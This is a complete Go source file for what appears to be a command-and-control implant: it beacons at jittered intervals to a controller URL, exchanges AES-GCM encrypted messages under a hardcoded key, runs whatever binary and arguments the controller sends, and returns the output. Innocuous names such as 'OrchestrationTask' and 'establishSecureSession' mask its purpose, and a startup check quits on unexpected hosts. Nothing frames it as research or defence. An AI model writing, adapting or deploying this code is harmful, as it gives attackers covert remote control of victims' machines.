package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/json"
	"io"
	"math/big"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

type CiphertextPackage struct {
	Entropy []byte `json:"entropy"`
	Payload []byte `json:"payload"`
}

type OrchestrationTask struct {
	TaskUUID   string   `json:"task_uuid"`
	BinaryPath string   `json:"binary_path"`
	Parameters []string `json:"parameters"`
	TimeLimit  int64    `json:"time_limit"`
}

type ExecutionSummary struct {
	TaskUUID     string `json:"task_uuid"`
	OutputStream []byte `json:"output_stream"`
	ErrorStream  []byte `json:"error_stream"`
	Termination  int    `json:"termination"`
	ExecutionMs  int64  `json:"execution_ms"`
}

var (
	fabricationKey   = []byte("0123456789abcdef0123456789abcdef")
	controllerUplink = "http://127.0.0.1:8080/v1/sync"
	concurrencyLimit = make(chan struct{}, 5)
)

func main() {
	if !auditIntegritySurroundings() {
		os.Exit(0)
	}

	establishSecureSession()
}

func auditIntegritySurroundings() bool {
	if runtime.GOOS != "linux" && runtime.GOOS != "darwin" {
		return false
	}

	if os.Getppid() == 1 {
		return true
	}

	executable, err := os.Executable()
	if err != nil {
		return false
	}

	info, err := os.Stat(executable)
	if err != nil {
		return false
	}

	if info.Size() < 1024 {
		return false
	}

	return true
}

func establishSecureSession() {
	sessionClient := &http.Client{
		Timeout: 60 * time.Second,
		Transport: &http.Transport{
			MaxIdleConnsPerHost: 10,
			IdleConnTimeout:     120 * time.Second,
		},
	}

	for {
		taskObject, err := synchronizeWithController(sessionClient)
		if err == nil && taskObject != nil {
			concurrencyLimit <- struct{}{}
			go func(t *OrchestrationTask) {
				defer func() { <-concurrencyLimit }()
				performTaskLifecycle(t, sessionClient)
			}(taskObject)
		}

		time.Sleep(calculateAdaptiveJitter(15, 45))
	}
}

func synchronizeWithController(client *http.Client) (*OrchestrationTask, error) {
	heartbeat, _ := json.Marshal(map[string]string{"state": "operational"})
	encryptedHeartbeat, err := encryptPayload(heartbeat)
	if err != nil {
		return nil, err
	}

	req, _ := http.NewRequest("POST", controllerUplink, bytes.NewReader(encryptedHeartbeat))
	req.Header.Set("Content-Type", "application/octet-stream")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, nil
	}

	buffer, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	decrypted, err := decryptPayload(buffer)
	if err != nil {
		return nil, err
	}

	var task OrchestrationTask
	if err := json.Unmarshal(decrypted, &task); err != nil {
		return nil, nil
	}

	return &task, nil
}

func performTaskLifecycle(task *OrchestrationTask, client *http.Client) {
	summary := dispatchIncomingTask(task)
	transmitExecutionSummary(summary, client)
}

func dispatchIncomingTask(task *OrchestrationTask) *ExecutionSummary {
	timestamp := time.Now()
	
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(task.TimeLimit)*time.Second)
	defer cancel()

	process := exec.CommandContext(ctx, task.BinaryPath, task.Parameters...)
	var stdout, stderr bytes.Buffer
	process.Stdout = &stdout
	process.Stderr = &stderr

	err := process.Run()
	
	exitStatus := 0
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitStatus = exitErr.ExitCode()
		} else {
			exitStatus = -1
		}
	}

	return &ExecutionSummary{
		TaskUUID:     task.TaskUUID,
		OutputStream: stdout.Bytes(),
		ErrorStream:  stderr.Bytes(),
		Termination:  exitStatus,
		ExecutionMs:  time.Since(timestamp).Milliseconds(),
	}
}

func transmitExecutionSummary(summary *ExecutionSummary, client *http.Client) {
	serialized, _ := json.Marshal(summary)
	encrypted, _ := encryptPayload(serialized)
	
	req, _ := http.NewRequest("PUT", controllerUplink, bytes.NewReader(encrypted))
	resp, err := client.Do(req)
	if err == nil {
		resp.Body.Close()
	}
}

func encryptPayload(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(fabricationKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	ciphertext := gcm.Seal(nil, nonce, data, nil)
	
	pkg := CiphertextPackage{
		Entropy: nonce,
		Payload: ciphertext,
	}

	return json.Marshal(pkg)
}

func decryptPayload(data []byte) ([]byte, error) {
	var pkg CiphertextPackage
	if err := json.Unmarshal(data, &pkg); err != nil {
		return nil, err
	}

	block, err := aes.NewCipher(fabricationKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	return gcm.Open(nil, pkg.Entropy, pkg.Payload, nil)
}

func calculateAdaptiveJitter(base, ceiling int64) time.Duration {
	delta := ceiling - base
	if delta <= 0 {
		return time.Duration(base) * time.Second
	}

	randomValue, _ := rand.Int(rand.Reader, big.NewInt(delta))
	return time.Duration(base+randomValue.Int64()) * time.Second
}
